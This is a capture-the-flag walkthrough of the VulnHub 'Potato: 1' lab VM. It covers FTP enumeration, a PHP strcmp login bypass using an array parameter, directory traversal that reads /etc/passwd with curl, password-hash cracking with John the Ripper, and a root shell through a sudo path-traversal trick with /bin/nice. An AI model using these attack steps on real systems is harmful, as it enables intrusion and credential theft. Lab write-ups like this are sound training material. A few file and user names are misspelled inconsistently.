# Potato: 1 Walkthrough

## Preparation
1. Download Potato.ova file ([Potato.ova](https://download.vulnhub.com/potato/Potato.ova))

1. Import the OVA file in the VirtualBox

1. Set the network adapter to Host-only Adapter
    * Attached to: **Host-only Adapter**
    ![Host-onlyAdapter](./img/potato_server_network.png)

1. Start the Potato virtual machine
    * Turn on the potato virtual machine from the VirtualBox
    ![StartPotato](./img/potato_server_initial.png)

1. Confirm the IP address of the Potato virtual machine from the attack virtual machine  
    * `sudo netdiscover -i enp0s3 -r 192.168.56.0/24`  
    ![netdiscover](./img/potato_server1.png)  
    ![PotatoIP-Address](./img/potato_server2.png)  
        * 192.168.56.100: DHCP Server
        * **192.168.56.102**: Potato Server

1. Set the Potato IP address to the environment variance  
`export IP=192.168.56.102`  

## Reconnaissance
1. Do portscan using Nmap  
    * `sudo nmap -sC -sV -Pn -p- $IP -oN nmap_result.txt`  
    ![nmap](./img/potato_server3.png)
        * -sC: Scan with default script
        * -sV: Show software name and the version
        * -Pn: Do not confirm communication before port scan (We have already confirmed the Potato IP address.)
        * -p-: Scan all ports (from 0 to 65535 ports)
        * -oN: Output the scan results to the specified file

1. As we see the nmap result, we can attempt to log in with AnonymousFTP.  

## Initial Access
1. Access the FTP service  
    * `ftp $IP 2112`  
    ![FTP-Access](./img/potato_server4.png)
        * Name: anonymous
        * Password: password (empty is OK)

1. Get index.php.bak and welcome.msg files
    * `get index.php.bak`, `get welcome.msg`  
    ![GetFiles](./img/potato_server5.png)

1. Exit FTP service  
    * Input the `exit`  

1. Confirm the downloaded files  
    * Investigate the "welcome.msg" and confirm the content  -> There is no useful information in this file 
    ![Welcome.msg](./img/potato_server6.png)  
    * Investigate the "index.php.bak" and confirm the content -> the username is fixed to "admin" and the default pass is "potato"  
    ![index.php.bak](./img/potato_server7.png)  
 
1. Since we know the index.php page and the Nmap result shows the 80 port is open, we find accessible files and directories using Gobuster.
    - Set the 80 port URL to the environment variance  
    `export URL="http://$IP:80/"`  
    - Input the following gobuster command  
    `gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt`  
        * dir: Enumerate directories and files
        * -u: Designate target URL
        * -w: Use dictionary file
    - Find /admin directory
    ![admin_directory](./img/potato_server8.png)

1. Access the /admin page using Burp
    - Proxy -> Intercept -> Intercept on -> Open browser -> Enter "http://192.168.56.102/admin" in the browser  
    - Click "Forward" until Login page is shown
    - Enter "admin" in the User and "test" in the Password and click Login button
    - In the "index.php.bak" file, the password is confirmed using the strcmp() function. In the PHP strcmp() function, we designate an array type, and it causes an error. Unfortunately, "NULL == 0" becomes **True** in PHP specification.
    - Change the input password in the Burp  
    Current: `username=admin&password=test`  
    Changed: `username=admin&password[]=test`  
    ![Burp_password](./img/potato_server9.png)  
    - Change to "Intercept off"
    - Go to the dashboard page and access the Logs page  

## Execution
1. Attempt directory traversal in the Logs page
    - Change to "Intercept on"
    - Select log_01.txt (log_02.txt or log_03.txt is OK) and click the "Get the log" button
    - Change the log_01.txxt file directory  
    Current: `file=log_01.txt`  
    Changed: `../../../../../etc/passwd`  
    ![file_directory](./img/potato_server10.png)  
    ![etc_passwd](./img/potato_server11.png)

1. Make /etc/passwd data file using the Cookie pass and curl command
    - Cookie pass is as follows  
    ![Cookie_pass](./img/potato_server12.png)  
    - Curl command is as follows  
    `curl -X POST -b "pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh" -d 'file=../../../../../etc/passwd' "http://192.168.56.102/admin/dashboard.php?page=log" | tr '\0' '\n' | cat > etc_passwd.txt`  
        * -X: Designate HTTP method
        * -b: Send Cookie
        * -d: Send form as POST request
        * tr '\0' '\n': Replace null with carriage return
        * cat > etc_passwd.txt: Output the command result in the etc_passwd.txt

1. Analyze the etc_passwd.txt
    - Extract login-enabled users using the following command  
    `cat etc_passed.txt | grep -P 'sh$'`  
    ![Login-enabled-users](./img/potato_server13.png)
        * grep -P 'sh$' is used to search for lines in a file that end with the string sh
        * Login-enabled users have "bash" or "sh" in the 7th field
        * There are "root", "floarianges", and "webadmin" users
    - Extract users who have password hash from the etc_passed.txt file  
    `cat etc_passwd.txt | grep -P 'sh$' | grep webadmin > webadmin_hash.txt`  
    - Decrypt password hash using John the Ripper  
    `john webadmin_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`  
    ![john](./img/potato_server14.png)
        * webadmin password: **dragon**  

## Credential Access for general user
1. SSH access
    - From the Nmap result, as the SSH port is open, we attempt to access SSH
    ![SSH-access](./img/potato_server15.png)
        * password: **dragon**
    - Confirm the home directory and access the user.txt file
    ![General-user-text](./img/potato_server16.png)  

## Privilege Escalation
1. Access to the other user home directory
    * While analyzing password hash, we know there is a "florianges" user
    * Access to the "home/floarianges" directory and seek attackable files  
    ![floarianges-home](./img/potato_server17.png)  
    * There is a suspicious "sudo_as_admin_successful" file but the file size is 0 -> Think other approaches

1. Confirm sudo setting  
    * Check webadmin's permission using `sudo-l`
    * password: **dragon**  
    ![sudo-webadmin](./img/potato_server18.png)  
    * webadmin can execute "/bin/nice" program (x has been granted)
    * We find that "/bin/nice" is used to modify the scheduling priority from the man command
    * There is no read permission for the "/notes/clear.sh" and "/notes/id.sh" files  

1. Investigate the "clear.sh" and "id.sh" files' behaviors  
    * `sudo /bin/nice /notes/clear.sh` -> The display is cleared
    * `sudo /bin/nice /notes/id.sh` -> The "id.sh" is implied to be executed with root permission and webadmin may gain root permission
    ![notes-id.sh](./img/potato_server19.png)  

1. Escalation
    * Excecute /bin/bash using nice command  
    **`sudo /bin/nice /notes/../bin/bash`**  
    ![Escalation](./img/potato_server20.png)  
    * Return root permission's prompt (# is displayed)  

## Credential Access for root user
1. Access the "root.txt" file of root user
    * Go to the root directory and access the "root.txt" file  
    ![root.txt](./img/potato_server21.png)